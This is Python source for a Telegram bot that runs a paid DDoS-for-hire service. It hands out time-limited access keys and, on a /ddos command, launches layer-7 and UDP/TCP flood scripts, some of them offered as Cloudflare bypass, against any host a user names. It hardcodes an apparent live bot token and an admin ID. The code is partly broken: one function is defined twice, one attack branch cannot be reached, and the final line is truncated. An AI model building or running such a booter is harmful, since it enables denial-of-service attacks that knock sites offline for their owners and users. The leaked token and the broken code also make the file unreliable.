﻿import telebot
import threading
import subprocess
import time
import psutil
import datetime
import hashlib
import sqlite3

bot_token = '7245382560:AAEADWRE_PEIChmumO9vdt55wXPEhAXQ1S4'
bot = telebot.TeleBot(bot_token)
ADMIN_ID = 5877930261
allowed_users = []
is_bot_active = True

key_dict = {}
cooldown_dict = {}
valid_keys = {}


def run_attack(command, duration, message):
    cmd_process = subprocess.Popen(command)
    start_time = time.time()

    while cmd_process.poll() is None:
        if psutil.cpu_percent(interval=1) >= 1:
            time_passed = time.time() - start_time
            if time_passed >= 120:
                cmd_process.terminate()
                bot.reply_to(message, "attack succsesfull.")
                return
        if time.time() - start_time >= duration:
            cmd_process.terminate()
            cmd_process.wait()
            return

def get_thread_connection():
    return sqlite3.connect('user_data.db')

def create_table():
    conn = get_thread_connection()
    cursor = conn.cursor()

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            key TEXT,
            expiration_time TEXT
        )
    ''')
    conn.commit()
    conn.close()

create_table()

@bot.message_handler(commands=['key'])
def generate_key(message):
    admin_id = message.from_user.id
    if admin_id != ADMIN_ID:
        return

    key = message.text.split()[1]
    expiration_time = datetime.datetime.now() + datetime.timedelta(days=30)

    conn = get_thread_connection()
    cursor = conn.cursor()

    cursor.execute('INSERT INTO users (key, expiration_time) VALUES (?, ?)', (key, expiration_time.strftime('%Y-%m-%d %H:%M:%S')))
    conn.commit()

    conn.close()

    valid_keys[key] = expiration_time
    bot.reply_to(message, f'tekan key "{key}" succses penggunaan bot 30 day.')

@bot.message_handler(commands=['nhapkey'])
def enter_key(message):
    user_id = message.from_user.id

    if len(message.text.split()) != 2:
        return

    key = message.text.split()[1]

    if key in valid_keys and valid_keys[key] > datetime.datetime.now():
        allowed_users.append(user_id)
        del valid_keys[key]
        save_user_to_database(user_id, key)
        bot.reply_to(message, 'silahkan masukan key terlebih dahulu /ddos perintah gagal.')
    else:
        bot.reply_to(message, 'jika ingin membeli key silahkan hubungi admin.')

def load_users_from_database():
    conn = get_thread_connection()
    cursor = conn.cursor()

    cursor.execute('SELECT user_id, expiration_time FROM users')
    rows = cursor.fetchall()
    current_time = datetime.datetime.now()

    for row in rows:
        user_id = row[0]
        expiration_time = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')

        if expiration_time > current_time:
            allowed_users.append(user_id)

    conn.close()


def save_user_to_database(user_id, key):
    new_connection = sqlite3.connect('user_data.db')
    new_cursor = new_connection.cursor()

    expiration_time = datetime.datetime.now() + datetime.timedelta(days=30)
    new_cursor.execute('''
        INSERT OR REPLACE INTO users (user_id, key, expiration_time)
        VALUES (?, ?, ?)
    ''', (user_id, key, expiration_time.strftime('%Y-%m-%d %H:%M:%S')))
    new_connection.commit()

    new_connection.close()  # Close the connection when done

load_users_from_database()

@bot.message_handler(commands=['start', 'help'])
def lenh(message):
    help_text = '''
⠀⠀
▮DDOS ● family-xc ✈
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┣➤/getkey [ Get Key ]
┣➤/key    [ masukan Key ]
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┣➤/methods [ Show Methods Layer 7 ]💥
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
'''
    bot.reply_to(message, help_text)

is_bot_active = True
@bot.message_handler(commands=['methods'])
def methods(message):
    help_text = '''
⠀
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┣➤Methods Layer7
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┣➤TLS [ Hold site ]
┣➤CF-BYPASS [ CF,UAM ]
┣➤FLOOD [ HTTP-DDOS ]
┣➤UDP-FLOOD [ basic ]
┣➤TCP-FLOOD [ basic ]
┣➤NUKE [CF STATIC]
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┣➤/ddos [ ? ] Methods Target ✈
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
'''
    bot.reply_to(message, help_text)

allowed_users = []  # Define your allowed users list
cooldown_dict = {}
is_bot_active = True

def run_attack(command, duration, message):
    cmd_process = subprocess.Popen(command)
    start_time = time.time()

    while cmd_process.poll() is None:
        # Check CPU usage and terminate if it's too high for 10 seconds
        if psutil.cpu_percent(interval=1) >= 1:
            time_passed = time.time() - start_time
            if time_passed >= 90:
                cmd_process.terminate()
                bot.reply_to(message, "succssesfull")
                return
        # Check if the attack duration has been reached
        if time.time() - start_time >= duration:
            cmd_process.terminate()
            cmd_process.wait()
            return

@bot.message_handler(commands=['ddos'])
def attack_command(message):
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot commcad sallah.')
        return

    if len(message.text.split()) < 3:
        bot.reply_to(message, 'penggunaan commcad.\nrun attack: /ddos <methods> <link website>')
        return

    username = message.from_user.username

    current_time = time.time()
    if username in cooldown_dict and current_time - cooldown_dict[username].get('ddos', 0) < 120:
        remaining_time = int(0 - (current_time - cooldown_dict[username].get('ddos', 0)))
        bot.reply_to(message, f"@{username} tunggu sebentar {remaining_time} sebelum menunakan commcad /attack.")
        return
    
    args = message.text.split()
    method = args[1].upper()
    host = args[2]

    if method in ['UDP-FLOOD', 'TCP-FLOOD'] and len(args) < 4:
        bot.reply_to(message, f'masukan port.\nVí dụ: /ddos <methods> <ip> <port>')
        return

    if method in ['UDP-FLOOD', 'TCP-FLOOD']:
        port = args[3]
    else:
        port = None

    blocked_domains = [".edu.vn", ".gov.vn"]   
    if method == 'TLS' or method == 'DESTROY' or method == 'CF-BYPASS' or method == 'FLOOD' or method == 'SKYNET':
        for blocked_domain in blocked_domains:
            if blocked_domain in host:
                bot.reply_to(message, f"jngan menyerang situs ini {blocked_domain}")
                return

    if method in ['TLS', 'CF-BYPASS', 'UDP-FLOOD', 'TCP-FLOOD', 'FLOOD']:
        # Update the command and duration based on the selected method
        if method == 'TLS':
            command = ["node", "TLS", host, "500", "64", "8", "proxy.txt"]
            duration = 120
        elif method == 'CF-BYPASS':
            command = ["node", "CFBYPASS.js", host, "500", "64", "8", "proxy.txt"]
            duration = 120
        elif method == 'FLOOD':
            command = ["node", "flood.js", host, "500", "8", "proxy.txt", "64", "15"]
            duration = 120
        elif method == 'UDP-FLOOD':
            if not port.isdigit():
                bot.reply_to(message, 'Port harap di masukan.')
                return
            command = ["python", "udp.py", host, port, "120", "64", "35"]
            duration = 120
        elif method == 'TCP-FLOOD':
            if not port.isdigit():
                bot.reply_to(message, 'Port harap di masukan.')
                return
            command = ["python", "tcp.py", host, port, "120", "64", "35"]
            duration = 120
        elif method == 'NUKE':
            command = ["node", "NUKE.js", host, "443", "500"]
            duration = 120


        cooldown_dict[username] = {'attack': current_time}

        attack_thread = threading.Thread(target=run_attack, args=(command, duration, message))
        attack_thread.start()
        bot.reply_to(message, f'┏━━━━━━━━━━━━━━┓\n┃   Successful Attack!!!\n┗━━━━━━━━━━━━━━➤\n  ┏➤Admin: @izunasec\n  ➤ name » {username} «\n  ➤ Host » {host} «\n  ➤ TIME » 180s «\n  ➤ Methods » {method} «\n  ➤ Cooldown » 120s «\n  ➤ Plan » VIP «\n  ┗➤Bot Ver 2.0')
    else:
        bot.reply_to(message, 'daptar perintah untuk melihat daptar /methods')


bot.infinity_polling(timeout=60, long_polling_timeout = 1